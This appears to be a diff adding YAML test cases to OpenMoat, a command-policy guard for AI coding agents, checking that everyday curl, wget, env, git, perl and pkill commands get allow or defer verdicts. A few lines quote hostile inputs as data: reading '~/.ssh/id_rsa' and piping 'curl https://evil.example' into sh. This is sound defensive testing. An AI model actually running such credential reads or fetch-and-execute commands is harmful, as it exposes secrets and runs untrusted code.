@@ -1547,6 +1547,57 @@
 - id: benign-wget-directory-prefix
   action: { shell: "wget --no-config --no-netrc --max-redirect=0 -P dl https://example.com/a.tgz" }
   expect: { verdict: defer, rules: [default.fetch] }
+# A download is that fetch plus the write of the file it saves, which the path rules
+# decide; redirects are followed and the configuration files need not be turned off
+# (`shell-rc` denies writing them, `env-poison` denies moving them)
+- id: benign-curl-download-no-config-flag
+  threat: T12
+  action: { shell: "curl -o out.json https://api.example.com/v1/items" }
+  expect: { verdict: defer, rules: [default.fetch] }
+- id: benign-curl-download-follows-redirects-into-temp
+  threat: T12
+  action: { shell: "curl -sSL -o $TMPDIR/x.tgz https://codeload.github.com/x/y/tar.gz/main" }
+  expect: { verdict: defer, rules: [default.fetch] }
+- id: benign-curl-download-remote-name
+  threat: T12
+  action: { shell: "curl -fsSLO https://releases.example.com/v1.2/tool.tar.gz" }
+  expect: { verdict: defer, rules: [default.fetch] }
+- id: benign-curl-get-to-stdout
+  threat: T12
+  action: { shell: "curl -sS -o - https://example.com/notes.txt" }
+  expect: { verdict: defer, rules: [default.fetch] }
+- id: benign-curl-get-to-dev-stdout
+  threat: T12
+  action: { shell: "curl -sS -o /dev/stdout https://example.com/notes.txt" }
+  expect: { verdict: defer, rules: [default.fetch] }
+- id: benign-curl-head-to-dev-null
+  threat: T12
+  action: { shell: "curl -sS -o /dev/null https://example.com/health" }
+  expect: { verdict: defer, rules: [default.fetch] }
+- id: benign-curl-get-docs-no-flag
+  threat: T12
+  action: { shell: "curl https://docs.rs/serde" }
+  expect: { verdict: defer, rules: [default.fetch] }
+- id: benign-curl-get-follows-redirects
+  threat: T12
+  action: { shell: "curl -q -sSL https://example.com/x" }
+  expect: { verdict: defer, rules: [default.fetch] }
+- id: benign-curl-get-location-long-option
+  threat: T12
+  action: { shell: "curl --location https://example.com/x" }
+  expect: { verdict: defer, rules: [default.fetch] }
+- id: benign-wget-without-no-netrc
+  threat: T12
+  action: { shell: "wget --no-config --max-redirect=0 https://x.test/a" }
+  expect: { verdict: defer, rules: [default.fetch] }
+- id: benign-wget-download-into-project
+  threat: T12
+  action: { shell: "wget -q https://raw.githubusercontent.com/x/y/main/README.md -O docs/x.md" }
+  expect: { verdict: defer, rules: [default.fetch] }
+- id: benign-wget-plain-download
+  threat: T12
+  action: { shell: "wget https://releases.example.com/v1.2/tool.tar.gz" }
+  expect: { verdict: defer, rules: [default.fetch] }
 - id: benign-setsid-build
   action: { shell: "setsid -f cargo build" }
   expect: { verdict: defer, rules: [default] }
@@ -1875,3 +1926,373 @@
   session: [{ fs_read: "~/.ssh/id_rsa" }]
   action: { mcp_tool: { name: mcp__playwright__browser_navigate, opens: ["https://docs.rs/releases/search?query=tokio+mutex"] } }
   expect: { verdict: ask, rules: [session-taint] }
+
+# Everyday commands that name what a rule guards without doing what the rule
+# stops; each stays an `allow` or a `defer`.
+# T1: `df` reports free space and opens none of the paths it is given (`du` reads the tree)
+- id: benign-t1-df-home
+  threat: T1
+  why: "`df -h ~` queries the file system holding the home folder and reads nothing in it."
+  action: { shell: "df -h ~" }
+  expect: { verdict: defer, rules: [default] }
+- id: benign-t1-df-absolute-home-tail
+  threat: T1
+  why: "`df` of a path spelt out in full is the same query; the pipe reads its one line."
+  action: { shell: "df /Users/me | tail -1" }
+  expect: { verdict: defer, rules: [default] }
+- id: benign-t1-df-home-variable
+  threat: T1
+  why: "`$HOME` names the same folder and `df` still opens nothing under it."
+  action: { shell: "df -h $HOME" }
+  expect: { verdict: defer, rules: [default] }
+# T1: a `~` in an interpreter's program is a delimiter or an operator, not a login name
+- id: benign-t1-perl-tilde-delimiter
+  threat: T1
+  why: "perl's `s~…~…~s` uses `~` as its delimiter; the trailing `~s` is a flag, not user `s`'s home; the substitution-only program rewrites the named file."
+  action: { shell: "perl -0pi -e 's~\\A.*?\\}#include \"core/Details\\.hpp\"~#include \"core/Details.hpp\"~s' src/core/Details.cpp" }
+  expect: { verdict: allow, rules: [text-tools, project-fs] }
+- id: benign-t1-perl-tilde-delimiter-spaced
+  threat: T1
+  why: "a `~` delimiter standing alone between spaces in the program is not the home folder."
+  action: { shell: "perl -0pi -e 's~    void a\\(\\) \\{ ~ void b() { ~' t.cpp" }
+  expect: { verdict: allow, rules: [text-tools] }
+- id: benign-t1-sed-tilde-delimiter
+  threat: T1
+  why: "a sed script with `~` as its `s` delimiter is data; only the file operand is read."
+  action: { shell: "sed -e 's~a~b~' f.txt" }
+  expect: { verdict: allow, rules: [text-tools, project-fs] }
+- id: benign-t1-awk-tilde-in-program
+  threat: T1
+  why: "a `~` inside an awk program is a regex operator; only the file operand is read."
+  action: { shell: "awk '{ sub(/~a/, \"b\"); print }' f.txt" }
+  expect: { verdict: allow, rules: [text-tools, project-fs] }
+# T5: an interpreter whose program is on its own command line reads the stream as data
+- id: benign-t5-curl-into-python-inline-code
+  threat: T5
+  why: "`python3 -I -c CODE` runs the code on the line; the download is JSON it parses from stdin."
+  action: { shell: "curl -s https://api.github.com/repos/x/y/releases/latest | python3 -I -c 'import json,sys; print(json.load(sys.stdin)[\"tag_name\"])'" }
+  expect: { verdict: defer, rules: [default] }
+- id: benign-t5-curl-into-node-inline-code
+  threat: T5
+  why: "`node -e CODE` runs the code on the line and reads the download as data."
+  action: { shell: "curl -s https://api.github.com/repos/x/y/releases/latest | node -e 'let d=\"\";process.stdin.on(\"data\",c=>d+=c).on(\"end\",()=>console.log(JSON.parse(d).tag_name))'" }
+  expect: { verdict: defer, rules: [default] }
+- id: benign-t5-curl-into-perl-inline-code
+  threat: T5
+  why: "`perl -ne CODE` filters the download with the program on the line."
+  action: { shell: "curl -s https://api.github.com/repos/x/y/releases/latest | perl -ne 'print if /tag_name/'" }
+  expect: { verdict: defer, rules: [default] }
+- id: benign-t5-curl-into-ruby-inline-code
+  threat: T5
+  why: "`ruby -e CODE` reads the download as data for the program on the line."
+  action: { shell: "curl -s https://api.github.com/repos/x/y/releases/latest | ruby -e 'puts STDIN.read.length'" }
+  expect: { verdict: defer, rules: [default] }
+- id: benign-t5-curl-into-jq
+  threat: T5
+  why: "`jq` is a filter over the downloaded JSON and runs nothing."
+  action: { shell: "curl -s https://api.github.com/repos/x/y/releases/latest | jq -r .tag_name" }
+  expect: { verdict: defer, rules: [default] }
+- id: benign-t5-curl-into-grep
+  threat: T5
+  why: "`grep -o` picks text out of the download; nothing in the pipe runs it."
+  action: { shell: "curl -s https://api.github.com/repos/x/y/tags | grep -o 'releases/tag/[^\"]*' | sort -u | head -5" }
+  expect: { verdict: defer, rules: [default] }
+- id: benign-t5-decoded-into-python-inline-code
+  threat: T5
+  why: "a decoded stream read by inline code is data to that code, not a program."
+  action: { shell: "echo aGk= | base64 -d | python3 -c 'import sys; print(sys.stdin.read())'" }
+  expect: { verdict: defer, rules: [default] }
+# T3: a pipe that keeps only the variable names of an environment listing
+- id: benign-t3-env-names-cut
+  threat: T3
+  why: "`cut -d= -f1` prints the part before the first `=`, the names, and drops the values."
+  action: { shell: "env | cut -d= -f1" }
+  expect: { verdict: defer, rules: [default] }
+- id: benign-t3-env-names-cut-separate-values
+  threat: T3
+  why: "the same `cut` with its option values as separate words."
+  action: { shell: "env | cut -d = -f 1" }
+  expect: { verdict: defer, rules: [default] }
+- id: benign-t3-printenv-names-sed
+  threat: T3
+  why: "`sed 's/=.*//'` deletes everything from the first `=` to the end of each line."
+  action: { shell: "printenv | sed 's/=.*//'" }
+  expect: { verdict: defer, rules: [default] }
+- id: benign-t3-env-names-sed-extended
+  threat: T3
+  why: "the extended-regex spelling with an anchored `$` deletes the same values."
+  action: { shell: "env | sed -E 's/=.*$//'" }
+  expect: { verdict: defer, rules: [default] }
+- id: benign-t3-env-names-awk
+  threat: T3
+  why: "`awk -F= '{print $1}'` prints the first `=`-separated field, the name."
+  action: { shell: "env | awk -F= '{print $1}'" }
+  expect: { verdict: defer, rules: [default] }
+- id: benign-t3-env-names-then-sort
+  threat: T3
+  why: "what follows the names-only filter sees names only."
+  action: { shell: "env | cut -d= -f1 | sort" }
+  expect: { verdict: defer, rules: [default] }
+# T4: a pattern's `*` reads one pipeline, so a later command's `--format=` is not a push flag
+- id: benign-t4-push-then-for-each-ref-format
+  threat: T4
+  why: "the push has no force flag; `--format=` belongs to the `git for-each-ref` after the `;`."
+  action: { shell: "git push -u origin b 2>&1 | tail -6; echo \"--- refs ---\"; git for-each-ref --format='%(refname:short) %(objectname:short)'" }
+  expect: { verdict: defer, rules: [default] }
+- id: benign-t4-push-then-echo-of-a-flag
+  threat: T4
+  why: "a word of the next command is not an option of the push."
+  action: { shell: "git push -u origin b; echo --format=x" }
+  expect: { verdict: defer, rules: [default] }
+# T9: `pkill`/`killall` patterns that cannot match `openmoat` or `moat`
+- id: benign-t9-pkill-script-name
+  threat: T9
+  why: "`latency-compare.py` has to appear in what the pattern matches, and no OpenMoat process name holds it."
+  action: { shell: "pkill -f latency-compare.py" }
+  expect: { verdict: defer, rules: [default] }
+- id: benign-t9-pkill-script-then-command-naming-moat
+  threat: T9
+  why: "a later command on the line mentioning `moat` is not an argument of the `pkill`."
+  action: { shell: "pkill -f \"latency-compare.py\" 2>/dev/null; bash moat-notes/scripts/pre-pr.sh x" }
+  expect: { verdict: defer, rules: [default] }
+- id: benign-t9-pkill-server-script
+  threat: T9
+  why: "`my-server.js` cannot match an OpenMoat process name."
+  action: { shell: "pkill -f my-server.js" }
+  expect: { verdict: defer, rules: [default] }
+- id: benign-t9-pkill-dev-server-regex
+  threat: T9
+  why: "the literal runs `node ` and `vite` of the pattern appear in no OpenMoat process name."
+  action: { shell: "pkill -f 'node .*vite'" }
+  expect: { verdict: defer, rules: [default] }
+- id: benign-t9-killall-node
+  threat: T9
+  why: "`killall node` names another program exactly."
+  action: { shell: "killall node" }
+  expect: { verdict: defer, rules: [default] }
+# T3: a test of whether a secret variable is set shows nothing of its value
+- id: benign-t3-presence-test-bracket
+  threat: T3
+  why: "`[ -n \"$X\" ]` prints nothing and exits by whether `X` is empty."
+  action: { shell: "[ -n \"$GITHUB_TOKEN\" ]" }
+  expect: { verdict: defer, rules: [default] }
+- id: benign-t3-absence-test-then-message
+  threat: T3
+  why: "`[ -z \"$X\" ]` tells whether `X` is unset; the message names no value."
+  action: { shell: "[ -z \"$NPM_TOKEN\" ] && echo missing" }
+  expect: { verdict: defer, rules: [default] }
+- id: benign-t3-presence-test-command
+  threat: T3
+  why: "`test -n` is the same check as `[ -n … ]`."
+  action: { shell: "test -n \"$GITHUB_TOKEN\"" }
+  expect: { verdict: defer, rules: [default] }
+- id: benign-t3-presence-test-double-bracket
+  threat: T3
+  why: "`[[ -n $X ]]` is bash's spelling of the same check."
+  action: { shell: "[[ -n $GITHUB_TOKEN ]]" }
+  expect: { verdict: defer, rules: [default] }
+- id: benign-t3-length-of-secret
+  threat: T3
+  why: "`${#X}` is the length of the value, not the value."
+  action: { shell: "echo ${#GITHUB_TOKEN}" }
+  expect: { verdict: allow, rules: [dev-shell] }
+- id: benign-t3-alternate-word-if-set
+  threat: T3
+  why: "`${X:+set}` expands to the word `set` or to nothing, never to the value."
+  action: { shell: "echo ${GITHUB_TOKEN:+set}" }
+  expect: { verdict: allow, rules: [dev-shell] }
+- id: benign-t3-alternate-word-if-defined
+  threat: T3
+  why: "`${X+set}` is the same with an empty value counting as set."
+  action: { shell: "echo ${GITHUB_TOKEN+set}" }
+  expect: { verdict: allow, rules: [dev-shell] }
+# awk programs whose `|` is regex alternation and whose `>` sits inside a regex or
+# a string are read-only: neither is a pipe or an output redirection (shell/awk.rs)
+- id: benign-awk-regex-alternation
+  action: { shell: "awk '/^## |^# /{print}' README.md" }
+  expect: { verdict: allow, rules: [text-tools, project-fs] }
+- id: benign-awk-field-separator-equals
+  action: { shell: "awk -F= '{print $1}' config.ini" }
+  expect: { verdict: allow, rules: [text-tools, project-fs] }
+- id: benign-awk-range-pattern
+  action: { shell: "awk '/a/,/b/' notes.txt" }
+  expect: { verdict: allow, rules: [text-tools, project-fs] }
+- id: benign-awk-sum-column
+  action: { shell: "awk '{s+=$1} END{print s}' sizes.txt" }
+  expect: { verdict: allow, rules: [text-tools, project-fs] }
+- id: benign-awk-conflict-markers-regex-after-print
+  action: { shell: "awk '/<<<<<<< /{p=1} p{print NR\": \"$0} />>>>>>> /{p=0}' src/lib.rs" }
+  expect: { verdict: allow, rules: [text-tools, project-fs] }
+- id: benign-awk-pipe-inside-string
+  action: { shell: "awk '{print \"a|b\", $1}' data.txt" }
+  expect: { verdict: allow, rules: [text-tools, project-fs] }
+- id: benign-awk-greater-than-inside-string
+  action: { shell: "awk '{print $1 \" -> \" $2}' data.txt" }
+  expect: { verdict: allow, rules: [text-tools, project-fs] }
+# `perl -i` with `-p` or `-n` and a program that is only `s` substitutions without
+# the `e` flag edits the files it names (shell/in_place.rs); the path rules decide,
+# as they do for `sed -i`
+- id: benign-perl-in-place-substitution-project-file
+  action: { shell: "perl -pi -e 's/foo/bar/g' src/lib.rs" }
+  expect: { verdict: allow, rules: [text-tools, project-fs] }
+- id: benign-perl-in-place-tilde-delimiter
+  action: { shell: "perl -0pi -e 's~\\A.*?\\}#include \"x\\.hpp\"~#include \"x.hpp\"~s' src/a.cpp" }
+  expect: { verdict: allow, rules: [text-tools, project-fs] }
+- id: benign-perl-in-place-backup-suffix
+  action: { shell: "perl -pi.bak -e 's/a/b/' README.md" }
+  expect: { verdict: allow, rules: [text-tools, project-fs] }
+- id: benign-perl-in-place-separate-flags-braces
+  action: { shell: "perl -i -pe 's{a}{b}gs' README.md" }
+  expect: { verdict: allow, rules: [text-tools, project-fs] }
+- id: benign-perl-in-place-two-substitutions
+  action: { shell: "perl -ni -e 's|a|b|; s/c/d/' README.md" }
+  expect: { verdict: allow, rules: [text-tools, project-fs] }
+- id: benign-perl-in-place-slurp
+  action: { shell: "perl -0777 -pi -e 's/a\\nb/c/' README.md" }
+  expect: { verdict: allow, rules: [text-tools, project-fs] }
+- id: benign-sed-in-place-substitution-project-file
+  action: { shell: "sed -i 's/a/b/' README.md" }
+  expect: { verdict: allow, rules: [text-tools, project-fs] }
+# `git -c KEY=VALUE` with a key that never names a program git runs (shell/git.rs)
+- id: benign-git-config-identity-commit
+  action: { shell: "git -c user.name=Bot -c user.email=bot@example.com commit -m x" }
+  expect: { verdict: allow, rules: [dev-shell] }
+- id: benign-git-config-gpgsign-off
+  action: { shell: "git -c commit.gpgsign=false commit -m x" }
+  expect: { verdict: allow, rules: [dev-shell] }
+- id: benign-git-config-advice-and-colour
+  action: { shell: "git -c advice.detachedHead=false -c color.ui=never checkout v1.0" }
+  expect: { verdict: allow, rules: [dev-shell] }
+- id: benign-git-config-line-endings
+  action: { shell: "git -c core.autocrlf=false -c core.safecrlf=false -c core.quotepath=off status" }
+  expect: { verdict: allow, rules: [dev-shell] }
+- id: benign-git-config-pull-and-fetch
+  action: { shell: "git -c pull.rebase=true -c pull.ff=only -c fetch.prune=true pull" }
+  expect: { verdict: allow, rules: [dev-shell] }
+- id: benign-git-config-rebase-and-merge
+  action: { shell: "git -c rebase.autostash=true -c rebase.autosquash=true -c merge.conflictstyle=diff3 rebase main" }
+  expect: { verdict: allow, rules: [dev-shell] }
+- id: benign-git-config-diff-log-status
+  action: { shell: "git -c diff.renames=true -c log.date=iso -c status.short=true log --stat" }
+  expect: { verdict: allow, rules: [dev-shell] }
+- id: benign-git-config-encoding-and-gc
+  action: { shell: "git -c i18n.commitEncoding=utf-8 -c gc.auto=0 commit -m x" }
+  expect: { verdict: allow, rules: [dev-shell] }
+- id: benign-git-config-push-defaults
+  action: { shell: "git -c push.default=current -c push.autoSetupRemote=true push" }
+  expect: { verdict: defer, rules: [default] }
+- id: benign-git-config-default-branch-init
+  action: { shell: "git -c init.defaultBranch=main init" }
+  expect: { verdict: defer, rules: [default] }
+# an empty `--template` tells git to copy no template at all
+- id: benign-git-init-empty-template
+  action: { shell: "git init --template= new" }
+  expect: { verdict: defer, rules: [default] }
+- id: benign-git-init-empty-template-separate-word
+  action: { shell: "git init --template '' new" }
+  expect: { verdict: defer, rules: [default] }
+# an editor variable set to a no-op or a reader, and `PATH` kept as it is or set to
+# system directories only, change nothing about what later commands run
+# (shell/tokens.rs), so `env-poison` does not see them; the command itself is decided
+# as without them (`git rebase --continue` and `env … cmd` defer to the agent's prompt)
+- id: benign-git-editor-true-rebase-continue
+  action: { shell: "GIT_EDITOR=true git rebase --continue" }
+  expect: { verdict: defer, rules: [default] }
+- id: benign-editor-true-commit-amend
+  action: { shell: "EDITOR=true git commit --amend" }
+  expect: { verdict: allow, rules: [dev-shell] }
+- id: benign-visual-true-commit
+  action: { shell: "VISUAL=true git commit -a" }
+  expect: { verdict: allow, rules: [dev-shell] }
+- id: benign-git-editor-colon
+  action: { shell: "GIT_EDITOR=: git rebase --continue" }
+  expect: { verdict: defer, rules: [default] }
+- id: benign-git-editor-cat
+  action: { shell: "GIT_EDITOR=cat git commit --amend" }
+  expect: { verdict: allow, rules: [dev-shell] }
+- id: benign-git-sequence-editor-true
+  action: { shell: "GIT_SEQUENCE_EDITOR=true git rebase -i main" }
+  expect: { verdict: defer, rules: [default] }
+- id: benign-export-git-editor-true
+  action: { shell: "export GIT_EDITOR=true; git commit --amend" }
+  expect: { verdict: defer, rules: [default] }
+- id: benign-path-kept
+  action: { shell: "PATH=$PATH cargo build" }
+  expect: { verdict: allow, rules: [dev-shell] }
+- id: benign-path-kept-quoted
+  action: { shell: "PATH=\"$PATH\" cargo test" }
+  expect: { verdict: allow, rules: [dev-shell] }
+- id: benign-path-system-directories
+  action: { shell: "PATH=/usr/bin:/bin:/usr/sbin:/sbin cargo build" }
+  expect: { verdict: allow, rules: [dev-shell] }
+- id: benign-env-clean-system-path
+  action: { shell: "env -i PATH=/usr/bin:/bin cargo build" }
+  expect: { verdict: defer, rules: [default] }
+- id: benign-env-clean-system-path-with-sbin
+  action: { shell: "env -i PATH=/usr/bin:/bin:/usr/sbin:/sbin git status" }
+  expect: { verdict: defer, rules: [default] }
+- id: benign-export-system-path
+  action: { shell: "export PATH=/usr/local/bin:/usr/bin:/bin && cargo build" }
+  expect: { verdict: defer, rules: [default] }
+# OpenMoat's own read-only commands (`openmoat-readonly`): usage, version, policy lint and
+# check, demo; by either name and by path. They read no state and change nothing.
+- id: benign-openmoat-help
+  threat: T9
+  action: { shell: "openmoat --help" }
+  expect: { verdict: allow, rules: [openmoat-readonly] }
+- id: benign-openmoat-help-short
+  threat: T9
+  action: { shell: "openmoat -h" }
+  expect: { verdict: allow, rules: [openmoat-readonly] }
+- id: benign-openmoat-help-subcommand
+  threat: T9
+  action: { shell: "openmoat help allow" }
+  expect: { verdict: allow, rules: [openmoat-readonly] }
+- id: benign-openmoat-build-help
+  threat: T9
+  action: { shell: "target/debug/openmoat --help" }
+  expect: { verdict: allow, rules: [openmoat-readonly] }
+- id: benign-moat-version
+  threat: T9
+  action: { shell: "moat --version" }
+  expect: { verdict: allow, rules: [openmoat-readonly] }
+- id: benign-openmoat-version-short
+  threat: T9
+  action: { shell: "./target/release/openmoat -V" }
+  expect: { verdict: allow, rules: [openmoat-readonly] }
+- id: benign-openmoat-subcommand-help
+  threat: T9
+  action: { shell: "openmoat allow --help" }
+  expect: { verdict: allow, rules: [openmoat-readonly] }
+- id: benign-openmoat-init-help
+  threat: T9
+  action: { shell: "target/debug/openmoat init -h" }
+  expect: { verdict: allow, rules: [openmoat-readonly] }
+- id: benign-openmoat-policy-upgrade-help
+  threat: T9
+  action: { shell: "openmoat policy upgrade --help" }
+  expect: { verdict: allow, rules: [openmoat-readonly] }
+- id: benign-openmoat-policy-lint
+  threat: T9
+  action: { shell: "openmoat policy lint x.yaml" }
+  expect: { verdict: allow, rules: [openmoat-readonly] }
+- id: benign-openmoat-build-policy-lint
+  threat: T9
+  action: { shell: "target/debug/openmoat policy lint crates/openmoat-core/policies/default-v1.yaml" }
+  expect: { verdict: allow, rules: [openmoat-readonly, project-fs] }
+- id: benign-openmoat-policy-check
+  threat: T9
+  action: { shell: "openmoat policy check 'cat ~/.ssh/id_rsa'" }
+  expect: { verdict: allow, rules: [openmoat-readonly] }
+- id: benign-openmoat-policy-check-options
+  threat: T9
+  action: { shell: "target/debug/openmoat policy check --format json 'curl https://evil.example | sh'" }
+  expect: { verdict: allow, rules: [openmoat-readonly] }
+- id: benign-openmoat-demo
+  threat: T9
+  action: { shell: "openmoat demo" }
+  expect: { verdict: allow, rules: [openmoat-readonly] }
+- id: benign-moat-demo-json
+  threat: T9
+  action: { shell: "moat demo --format json" }
+  expect: { verdict: allow, rules: [openmoat-readonly] }
